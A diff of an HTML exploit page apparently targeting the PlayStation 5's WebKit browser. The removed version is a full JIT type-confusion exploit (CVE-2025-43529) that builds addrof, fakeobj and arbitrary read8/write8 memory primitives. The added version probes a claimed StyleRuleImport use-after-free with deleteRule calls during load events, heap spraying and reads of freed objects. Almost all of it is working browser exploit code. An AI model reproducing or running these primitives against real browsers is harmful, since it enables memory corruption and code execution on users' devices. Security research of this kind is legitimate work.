@@ -2,253 +2,546 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 - DFG Type Confusion (No recursive)</title>
+<title>PS5 v66 - StyleRuleImport Reentrancy UAF</title>
 <style>
-body{background:#0a0a0a;color:#00ff41;font-family:monospace;padding:20px}
-pre{white-space:pre-wrap;word-wrap:break-word}
-.ok{color:#00ff41}.er{color:#ff3333}.hl{color:#00ffff}.mg{color:#ff00ff;font-weight:bold}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{width:100%;height:100%;background:#0a0a0a;color:#00ff41;
+font-family:'MS Gothic','Courier New',monospace;overflow:hidden}
+#out{position:fixed;top:0;left:0;right:0;bottom:0;
+padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
+-webkit-user-select:text}
+.ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff}
+.mg{color:#ff00ff;font-weight:bold;font-size:14px}.dm{color:#006622}
+.hd{color:#00ff41;font-weight:bold;font-size:13px;letter-spacing:1px}
+button{display:block;width:100%;padding:15px;margin:5px 0;font-size:18px;
+background:#111;color:#00ff41;border:1px solid #00ff41;cursor:pointer}
 </style>
 </head>
 <body>
-<pre id="o"></pre>
+<div id="out"></div>
 <script>
-var o=document.getElementById("o");
-function p(m,c){var s=document.createElement("span");if(c)s.className=c;
-s.textContent=m+"\n";o.appendChild(s);o.scrollTop=o.scrollHeight}
-function Ok(m){p("[+] "+m,"ok")}function Fl(m){p("[-] "+m,"er")}
-function Hi(m){p("[*] "+m,"hl")}function St(m){p("[!] "+m,"mg")}
+"use strict";
 
-p("=== DFG Type Confusion (No recursive) ===\n");
+var O=document.getElementById("out");
+function P(m,c){var s=document.createElement("span");if(c)s.className=c;
+s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight}
+function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
+function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m+" ★","mg")}
+function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
+function Hd(m){P("▸ "+m,"hd")}function Sep(){P("─".repeat(50),"dm")}
 
-try {
-    var arr = new Array(0x40_0000).fill(1.1);
-    var ai = arr.length - 1;
-    var rc = [];
+window.onerror=function(m,s,l){Fl("CRASH: "+m.substring(0,80)+" @"+l);return true};
 
-    function foo(flag, k, allocCount) {
-        var A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
-        arr[ai] = A;
-        var gc = [];
-        var a = new Date(1111);
-        a[0] = 1.1;
-        
-        // GC pressure via ArrayBuffer (NO recursive)
-        for (var j = 0; j < allocCount; ++j) {
-            gc.push(new ArrayBuffer(0x80_0000)); // 8MB each
-        }
-        
-        A.p2 = gc;
-        var b = { p0: 0x42424242, p1: 1.1 };
-        var f = b;
-        if (flag) { f = 1.1; }
-        A.p1 = f;
-        
-        // Reduced loop: 1e4 instead of 1e6 (enough for DFG trigger)
-        var v = 1.1;
-        for (var i = 0; i < 1e4; ++i) {
-            for (var j = 0; j < k; ++j) { v = i; v = j; }
-        }
-        b.p0 = v;
-        b.p1 = a;
-    }
+P("════════════════════════════════════","hd");
+P("  v66 — StyleRuleImport Reentrancy UAF","hd");
+P("  Source audit finding #2","hd");
+P("  Pure C++ reentrancy — NO JIT needed","hd");
+P("════════════════════════════════════","hd");
+P("");
 
-    // ============================================================
-    // Phase 1: DFG Warmup (50 invocations — enough for DFG)
-    // ============================================================
-    Hi("Phase 1: DFG Warmup (50 calls)...");
-    Hi("Each call has 1e4 loop (was 1e6 — 100x faster)");
+// ============================================================
+// BACKGROUND
+// ============================================================
+// Source audit found: StyleRuleImport::setCSSStyleSheet()
+// calls checkLoaded() which fires JS 'load' event.
+// Inside load handler, we deleteRule() the @import rule.
+// This frees StyleRuleImport while setCSSStyleSheet() 
+// is still on the call stack. No Ref<> protection exists.
+// ============================================================
+
+var testNum = 0;
+
+function runTest(testName, testFn) {
+    testNum++;
+    Sep();Hd("TEST " + testNum + ": " + testName);Sep();
+    P("");
     
-    foo(true, 1, 1);   // Initial type specialization
-    foo(false, 1, 1);  // Contradict type
+    try {
+        testFn();
+        Ok("Test " + testNum + " survived (no crash)");
+    } catch(e) {
+        Fl("Test " + testNum + " exception: " + e.message);
+    }
+    P("");
     
-    var warmupStart = Date.now();
-    for (var i = 0; i < 50; ++i) {
-        foo(false, 0, 0);  // Fast warmup (k=0, no alloc)
-        if (i % 10 === 0) p("  Warmup " + i + "/50...");
-    }
-    Ok("Warmup done in " + (Date.now() - warmupStart) + "ms");
-
-    // ============================================================
-    // Phase 2: GC pressure (replaces recursive)
-    // ============================================================
-    Hi("Phase 2: GC pressure via ArrayBuffer...");
-    
-    // Allocate and release to trigger GC cycles
-    for (var i = 0; i < 20; i++) {
-        var t = [];
-        for (var j = 0; j < 50; j++) t.push(new ArrayBuffer(0x100000)); // 1MB each
-        // Release — GC will collect these
-    }
-    Ok("GC pressure applied");
-
-    // ============================================================
-    // Phase 3: Trigger overlap (100 attempts, no recursive)
-    // ============================================================
-    Hi("Phase 3: Trigger overlap (100 attempts)...");
-    Hi("NO recursive() — just ArrayBuffer pressure");
-    
-    var win = false;
-    var ba, ua;
-    var triggerStart = Date.now();
-
-    for (var k = 0; k < 100 && !win; ++k) {
-        // Trigger foo with GC pressure
-        foo(false, 10, k % 5 + 1);
-        
-        // GC pressure via ArrayBuffer (replaces recursive(10000))
-        for (var i = 0; i < 3; ++i) new ArrayBuffer(0x4000);
-        
-        // Additional GC pressure
-        if (k % 10 === 0) {
-            var t = [];
-            for (var j = 0; j < 20; j++) t.push(new ArrayBuffer(0x100000));
-        }
-        
-        var fd = arr[ai].p1.p1;
-        var nc = 13.37;
-        
-        for (var i = 0; i < 16; ++i) {
-            var a2 = [13.37, 2.2, 3.3, 4.4, nc];
-            rc.push(a2);
-            if (fd[0] === 13.37) {
-                win = true;
-                ba = rc[rc.length - 1];
-                ba[0] = {};
-                ua = fd;
-                break;
-            }
-        }
-        
-        if (k % 10 === 0) p("  Attempt " + k + "/100... (" + (Date.now() - triggerStart) + "ms)");
-    }
-
-    if (!win) {
-        Fl("No overlap after 100 attempts");
-        Hi("This means DFG is NOT active on PS5.");
-        Hi("CVE-2025-43529 is impossible without JIT.");
-        Hi("Returning to CSSFontFace + EventTarget approach.");
-    } else {
-        St("OVERLAP FOUND! DFG IS ACTIVE!");
-        
-        // Build addrof/fakeobj
-        var ab = new ArrayBuffer(8);
-        var u64 = new BigUint64Array(ab);
-        var f64 = new Float64Array(ab);
-        function i2f(v) { u64[0] = v; return f64[0]; }
-        function f2i(f) { f64[0] = f; return u64[0]; }
-        
-        function addrof(obj) { ba[0] = obj; return f2i(ua[0]); }
-        function fakeobj(addr) { ua[0] = i2f(addr); return ba[0]; }
-        
-        var t = { x: 1.1 };
-        var ta = addrof(t);
-        Ok("addrof(t) = 0x" + ta.toString(16));
-        
-        // Build read8/write8
-        Hi("Building read8/write8...");
-        
-        var sp = [];
-        for (var i = 0; i < 500; ++i) sp.push({ p1: 1.1, p2: 2.2 });
-        
-        var oA = null, oAa = 0n;
-        for (var i = 1; i < sp.length; ++i) {
-            var prev = addrof(sp[i-1]);
-            var curr = addrof(sp[i]);
-            if (curr - prev === 0x20n) {
-                oA = sp[i-1];
-                oAa = prev;
-                Ok("Adjacent pair at 0x" + oAa.toString(16));
-                break;
-            }
-        }
-        
-        if (!oA) { Fl("No pair found"); throw "No pair"; }
-        
-        var fa = fakeobj(oAa + 0x10n);
-        var kn = [13.37, 2.2, 3.3, 4.4];
-        var kna = addrof(kn);
-        Ok("Known array at 0x" + kna.toString(16));
-        
-        Hi("Brute forcing StructureID...");
-        var fs = false, fc = 0n, fo = 0n;
-        var offs = [0x00n, 0x08n, 0x10n, 0x18n, 0x20n, 0x28n, 0x30n];
-        
-        for (var sid = 0; sid < 512 && !fs; ++sid) {
-            var cv = BigInt(sid) | 0x0024070000000000n;
-            try {
-                oA.p1 = i2f(cv);
-                for (var oi = 0; oi < offs.length; ++oi) {
-                    oA.p2 = i2f(kna + offs[oi]);
-                    try {
-                        var v = fa[0];
-                        if (v === 13.37) {
-                            fs = true; fc = cv; fo = offs[oi];
-                            St("FOUND SID=" + sid + " OFF=0x" + fo.toString(16));
-                            break;
-                        }
-                    } catch(e2) {}
-                }
-            } catch(e) {}
-        }
-        
-        if (!fs) {
-            // Try alternate types
-            var alts = [0x002403n, 0x002406n, 0x002408n];
-            for (var ti = 0; ti < alts.length && !fs; ++ti) {
-                for (var sid = 0; sid < 512 && !fs; ++sid) {
-                    var cv = BigInt(sid) | (alts[ti] << 32n);
-                    try {
-                        oA.p1 = i2f(cv);
-                        for (var oi = 0; oi < offs.length; ++oi) {
-                            oA.p2 = i2f(kna + offs[oi]);
-                            try {
-                                var v = fa[0];
-                                if (typeof v === 'number' && v === 13.37) {
-                                    fs = true; fc = cv; fo = offs[oi];
-                                    St("FOUND T=" + ti + " SID=" + sid + " OFF=0x" + fo.toString(16));
-                                    break;
-                                }
-                            } catch(e2) {}
-                        }
-                    } catch(e) {}
-                }
-            }
-        }
-        
-        if (!fs) { Fl("No structure found"); throw "No structure"; }
-        
-        oA.p1 = i2f(fc);
-        
-        function read8(addr) { oA.p2 = i2f(addr); return f2i(fa[0]); }
-        function write8(addr, val) { oA.p2 = i2f(addr); fa[0] = i2f(val); }
-        
-        // Test
-        var jsc = read8(kna);
-        Ok("read8(kna) = 0x" + jsc.toString(16));
-        
-        var bp = read8(kna + 0x08n);
-        Ok("butterfly = 0x" + bp.toString(16));
-        
-        var e0 = read8(bp);
-        Ok("elem[0] = " + i2f(e0) + " (expect 13.37)");
-        
-        write8(bp, f2i(99.99));
-        Ok("write8: kn[0] = " + kn[0] + " (expect 99.99)");
-        
-        St("=== EXPLOIT COMPLETE ===");
-        Ok("addrof:  ✅");
-        Ok("fakeobj: ✅");
-        Ok("read8:   ✅");
-        Ok("write8:  ✅");
-        Ok("StructureID: 0x" + fc.toString(16));
-        
-        Hi("Total time: " + (Date.now() - triggerStart) + "ms");
-    }
-
-} catch(e) {
-    Fl("ERROR: " + e);
-    p("Stack: " + (e.stack || ""));
+    // Small delay between tests
+    return new Promise(function(resolve){ setTimeout(resolve, 500); });
 }
+
+// ============================================================
+// TEST 1: Basic @import reentrancy via <link>
+// ============================================================
+// <link rel="stylesheet" href="data:text/css,@import url(data:text/css,...)">
+// When inner @import completes → checkLoaded() → load event on <link>
+// Inside load: link.sheet.deleteRule(0) → frees StyleRuleImport
+// ============================================================
+
+function test1_basic_link_import() {
+    Dm("Creating <link> with @import...");
+    
+    var link = document.createElement('link');
+    link.rel = 'stylesheet';
+    
+    // Outer CSS contains @import to inner CSS
+    var outerCSS = '@import url("data:text/css,body{color:red}")';
+    link.href = 'data:text/css,' + encodeURIComponent(outerCSS);
+    
+    var loadFired = false;
+    var deleteSucceeded = false;
+    
+    link.onload = function() {
+        loadFired = true;
+        Dm("  [load] Event fired!");
+        
+        try {
+            var sheet = link.sheet;
+            if (!sheet) {
+                Wr("  [load] No sheet available");
+                return;
+            }
+            
+            Dm("  [load] sheet.cssRules.length = " + sheet.cssRules.length);
+            
+            if (sheet.cssRules.length > 0) {
+                var rule = sheet.cssRules[0];
+                Dm("  [load] Rule type: " + rule.constructor.name);
+                Dm("  [load] Rule href: " + rule.href);
+                
+                // DELETE the @import rule — this should trigger the UAF
+                Dm("  [load] Deleting rule 0...");
+                sheet.deleteRule(0);
+                deleteSucceeded = true;
+                Ok("  [load] deleteRule() succeeded!");
+                
+                // If we get here without crash, check if rule is still accessible
+                Dm("  [load] Accessing rule after delete...");
+                try {
+                    var href = rule.href;
+                    Dm("  [load] rule.href after delete: " + href);
+                } catch(e) {
+                    Dm("  [load] rule.href error: " + e.message);
+                }
+            }
+        } catch(e) {
+            Fl("  [load] Error: " + e.message);
+        }
+    };
+    
+    document.head.appendChild(link);
+    
+    // Check after a delay
+    setTimeout(function() {
+        if (loadFired) {
+            Ok("  Load event fired");
+            if (deleteSucceeded) {
+                St("  ★ deleteRule() during load callback succeeded!");
+                Hi("  If browser didn't crash → UAF might be exploitable!");
+            }
+        } else {
+            Wr("  Load event did NOT fire (data: URI might load synchronously)");
+        }
+    }, 2000);
+}
+
+// ============================================================
+// TEST 2: @import inside <style> block
+// ============================================================
+
+function test2_style_import() {
+    Dm("Creating <style> with @import...");
+    
+    var style = document.createElement('style');
+    style.textContent = '@import url("data:text/css,body{color:blue}")';
+    
+    var loadFired = false;
+    
+    // <style> doesn't have onload in standard HTML
+    // But we can try mutation observer or other mechanisms
+    // Actually, let's try adding onload anyway — WebKit might support it
+    
+    style.onload = function() {
+        loadFired = true;
+        Dm("  [load] Style load event fired!");
+        
+        try {
+            var sheet = style.sheet;
+            if (sheet && sheet.cssRules.length > 0) {
+                Dm("  [load] Deleting rule 0...");
+                sheet.deleteRule(0);
+                Ok("  [load] deleteRule() succeeded!");
+            }
+        } catch(e) {
+            Fl("  [load] Error: " + e.message);
+        }
+    };
+    
+    document.head.appendChild(style);
+    
+    // Also try checking after delay
+    setTimeout(function() {
+        if (!loadFired) {
+            Dm("  <style> load event didn't fire, trying manual check...");
+            try {
+                var sheet = style.sheet;
+                if (sheet) {
+                    Dm("  sheet.cssRules.length = " + sheet.cssRules.length);
+                    if (sheet.cssRules.length > 0) {
+                        Dm("  Trying deleteRule(0)...");
+                        sheet.deleteRule(0);
+                        Ok("  Manual deleteRule() succeeded!");
+                    }
+                }
+            } catch(e) {
+                Fl("  Manual check error: " + e.message);
+            }
+        }
+    }, 2000);
+}
+
+// ============================================================
+// TEST 3: Multiple @imports — delete one during load
+// ============================================================
+
+function test3_multiple_imports() {
+    Dm("Creating <link> with multiple @imports...");
+    
+    var link = document.createElement('link');
+    link.rel = 'stylesheet';
+    
+    // Outer CSS with multiple @imports
+    var outerCSS = [
+        '@import url("data:text/css,body{color:red}")',
+        '@import url("data:text/css,div{color:blue}")',
+        '@import url("data:text/css,p{color:green}")'
+    ].join('\n');
+    
+    link.href = 'data:text/css,' + encodeURIComponent(outerCSS);
+    
+    var loadCount = 0;
+    
+    link.onload = function() {
+        loadCount++;
+        Dm("  [load] Event fired (count: " + loadCount + ")");
+        
+        try {
+            var sheet = link.sheet;
+            if (!sheet) return;
+            
+            Dm("  [load] Rules: " + sheet.cssRules.length);
+            
+            // Delete the FIRST @import rule
+            if (sheet.cssRules.length > 0) {
+                Dm("  [load] Deleting rule 0...");
+                
+                // Save reference before delete
+                var savedRule = sheet.cssRules[0];
+                Dm("  [load] savedRule.href = " + savedRule.href);
+                
+                sheet.deleteRule(0);
+                Ok("  [load] deleteRule(0) succeeded!");
+                
+                // Try to read from saved rule (UAF read)
+                Dm("  [load] Reading savedRule.href after delete...");
+                try {
+                    var href = savedRule.href;
+                    Hi("  [load] savedRule.href = " + href);
+                    
+                    // Check if value is unusual
+                    if (href && href.indexOf("data:") === -1 && href.length > 0) {
+                        St("  ★ UNUSUAL VALUE DETECTED — possible info leak!");
+                    }
+                } catch(e) {
+                    Dm("  [load] savedRule.href error: " + e.message);
+                }
+                
+                // Try to read .styleSheet (pointer field)
+                Dm("  [load] Reading savedRule.styleSheet after delete...");
+                try {
+                    var ss = savedRule.styleSheet;
+                    Hi("  [load] savedRule.styleSheet = " + ss);
+                } catch(e) {
+                    Dm("  [load] savedRule.styleSheet error: " + e.message);
+                }
+                
+                // Try to read .media
+                Dm("  [load] Reading savedRule.media after delete...");
+                try {
+                    var media = savedRule.media;
+                    Hi("  [load] savedRule.media = " + media);
+                } catch(e) {
+                    Dm("  [load] savedRule.media error: " + e.message);
+                }
+            }
+        } catch(e) {
+            Fl("  [load] Error: " + e.message);
+        }
+    };
+    
+    document.head.appendChild(link);
+}
+
+// ============================================================
+// TEST 4: @import + GC + spray + property read
+// ============================================================
+
+function test4_import_spray_read() {
+    Dm("Creating <link> with @import + spray...");
+    
+    var link = document.createElement('link');
+    link.rel = 'stylesheet';
+    
+    var outerCSS = '@import url("data:text/css,body{color:red}")';
+    link.href = 'data:text/css,' + encodeURIComponent(outerCSS);
+    
+    var savedRule = null;
+    
+    link.onload = function() {
+        Dm("  [load] Event fired!");
+        
+        try {
+            var sheet = link.sheet;
+            if (!sheet || sheet.cssRules.length === 0) return;
+            
+            // Save reference to the @import rule
+            savedRule = sheet.cssRules[0];
+            Dm("  [load] Saved rule reference");
+            Dm("  [load] rule.href = " + savedRule.href);
+            
+            // Delete the rule — frees StyleRuleImport if no other refs
+            Dm("  [load] Deleting rule...");
+            sheet.deleteRule(0);
+            Ok("  [load] Rule deleted");
+            
+            // Force GC to ensure the C++ object is freed
+            Dm("  [load] Forcing GC (16MB)...");
+            for (var i = 0; i < 4; i++) {
+                var t = [];
+                for (var j = 0; j < 128; j++) t.push(new ArrayBuffer(8192));
+            }
+            
+            // Spray with strings to reclaim the freed memory
+            Dm("  [load] Spraying strings...");
+            var spray = [];
+            for (var i = 0; i < 1000; i++) {
+                // Create strings that look like pointers
+                var s = String.fromCharCode(
+                    0x41, 0x41, 0x41, 0x41,  // 0x41414141
+                    0x00, 0x00, 0x00, 0x01,  // 0x01000000 (pointer-like)
+                    0x42, 0x42, 0x42, 0x42,
+                    0x00, 0x00, 0x00, 0x02
+                );
+                spray.push(s);
+            }
+            
+            // Now try to read properties through the saved reference
+            // If the C++ StyleRuleImport was freed and reclaimed by our spray,
+            // the getter will read from our controlled data
+            
+            Dm("  [load] Reading savedRule.href...");
+            try {
+                var href = savedRule.href;
+                Hi("  [load] href = '" + href + "'");
+                Hi("  [load] href length = " + href.length);
+                
+                // Check for non-ASCII (raw memory)
+                var hasRaw = false;
+                var hex = "";
+                for (var i = 0; i < Math.min(href.length, 32); i++) {
+                    var c = href.charCodeAt(i);
+                    if (c < 0x20 || c > 0x7E) hasRaw = true;
+                    var h = c.toString(16);
+                    hex += (h.length === 1 ? "0" + h : h) + " ";
+                }
+                
+                if (hasRaw) {
+                    St("  ★ RAW MEMORY IN href — INFO LEAK!");
+                    P("  hex: " + hex, "hl");
+                }
+            } catch(e) {
+                Fl("  [load] href error: " + e.message);
+            }
+            
+            Dm("  [load] Reading savedRule.styleSheet...");
+            try {
+                var ss = savedRule.styleSheet;
+                Hi("  [load] styleSheet = " + ss);
+                if (ss !== null && ss !== undefined) {
+                    St("  ★ styleSheet NOT null — possible type confusion!");
+                }
+            } catch(e) {
+                Fl("  [load] styleSheet error: " + e.message);
+            }
+            
+        } catch(e) {
+            Fl("  [load] Error: " + e.message);
+        }
+    };
+    
+    document.head.appendChild(link);
+}
+
+// ============================================================
+// TEST 5: Nested @import (import within import)
+// ============================================================
+
+function test5_nested_import() {
+    Dm("Creating nested @import chain...");
+    
+    var link = document.createElement('link');
+    link.rel = 'stylesheet';
+    
+    // Innermost CSS
+    var innerCSS = 'body{color:green}';
+    
+    // Middle CSS (imports inner)
+    var middleCSS = '@import url("data:text/css,' + encodeURIComponent(innerCSS) + '")\nbody{color:blue}';
+    
+    // Outer CSS (imports middle)
+    var outerCSS = '@import url("data:text/css,' + encodeURIComponent(middleCSS) + '")\nbody{color:red}';
+    
+    link.href = 'data:text/css,' + encodeURIComponent(outerCSS);
+    
+    link.onload = function() {
+        Dm("  [load] Outer load fired!");
+        
+        try {
+            var sheet = link.sheet;
+            if (!sheet) return;
+            
+            Dm("  [load] Rules: " + sheet.cssRules.length);
+            
+            if (sheet.cssRules.length > 0) {
+                var importRule = sheet.cssRules[0];
+                Dm("  [load] Import rule href: " + importRule.href);
+                
+                // Access the imported stylesheet
+                var importedSheet = importRule.styleSheet;
+                if (importedSheet) {
+                    Dm("  [load] Imported sheet rules: " + importedSheet.cssRules.length);
+                    
+                    // Delete the outer @import rule
+                    Dm("  [load] Deleting outer @import...");
+                    sheet.deleteRule(0);
+                    Ok("  [load] Outer @import deleted!");
+                    
+                    // Now try to access the imported sheet (UAF)
+                    Dm("  [load] Accessing importedSheet after delete...");
+                    try {
+                        var rules = importedSheet.cssRules;
+                        Hi("  [load] importedSheet.cssRules.length = " + rules.length);
+                        
+                        // Try reading rules from the freed sheet
+                        for (var i = 0; i < rules.length; i++) {
+                            var r = rules[i];
+                            Dm("  [load] Rule " + i + ": " + r.cssText);
+                        }
+                    } catch(e) {
+                        Fl("  [load] importedSheet access error: " + e.message);
+                    }
+                }
+            }
+        } catch(e) {
+            Fl("  [load] Error: " + e.message);
+        }
+    };
+    
+    document.head.appendChild(link);
+}
+
+// ============================================================
+// TEST 6: Rapid create + delete + read
+// ============================================================
+
+function test6_rapid_create_delete() {
+    Dm("Rapid @import create/delete cycle...");
+    
+    var results = [];
+    
+    for (var cycle = 0; cycle < 10; cycle++) {
+        try {
+            var link = document.createElement('link');
+            link.rel = 'stylesheet';
+            
+            var css = '@import url("data:text/css,body{color:red}")';
+            link.href = 'data:text/css,' + encodeURIComponent(css);
+            
+            var savedRule = null;
+            var localCycle = cycle;
+            
+            link.onload = function() {
+                try {
+                    var sheet = link.sheet;
+                    if (sheet && sheet.cssRules.length > 0) {
+                        savedRule = sheet.cssRules[0];
+                        var hrefBefore = savedRule.href;
+                        
+                        sheet.deleteRule(0);
+                        
+                        // Force GC
+                        for (var i = 0; i < 2; i++) {
+                            var t = [];
+                            for (var j = 0; j < 64; j++) t.push(new ArrayBuffer(8192));
+                        }
+                        
+                        // Read after delete
+                        var hrefAfter = savedRule.href;
+                        
+                        if (hrefBefore !== hrefAfter) {
+                            St("  Cycle " + localCycle + ": VALUE CHANGED!");
+                            P("    Before: " + hrefBefore, "hl");
+                            P("    After:  " + hrefAfter, "hl");
+                            results.push({cycle: localCycle, before: hrefBefore, after: hrefAfter});
+                        }
+                    }
+                } catch(e) {}
+            };
+            
+            document.head.appendChild(link);
+        } catch(e) {}
+    }
+    
+    // Check results after delay
+    setTimeout(function() {
+        P("");
+        Dm("Rapid cycle results:");
+        if (results.length > 0) {
+            St("  ★ " + results.length + " value changes detected!");
+        } else {
+            Dm("  No value changes detected");
+        }
+    }, 3000);
+}
+
+// ============================================================
+// RUN ALL TESTS
+// ============================================================
+
+async function runAll() {
+    P("Starting tests in 1 second...\n");
+    await new Promise(function(r){setTimeout(r, 1000)});
+    
+    await runTest("Basic <link> @import reentrancy", test1_basic_link_import);
+    await runTest("<style> @import reentrancy", test2_style_import);
+    await runTest("Multiple @imports — delete during load", test3_multiple_imports);
+    await runTest("@import + GC + spray + property read", test4_import_spray_read);
+    await runTest("Nested @import chain", test5_nested_import);
+    await runTest("Rapid create/delete cycle", test6_rapid_create_delete);
+    
+    // Final summary after all tests
+    setTimeout(function() {
+        Sep();Hd("FINAL SUMMARY");Sep();
+        P("");
+        P("  If any test crashed the browser → UAF is real");
+        P("  If any test showed 'UNUSUAL VALUE' → info leak possible");
+        P("  If all tests survived with normal values → defensive mechanism exists");
+        P("");
+        St("★ v66 StyleRuleImport UAF Test Complete ★");
+    }, 5000);
+}
+
+// Start
+runAll();
+
 </script>
 </body>
 </html>
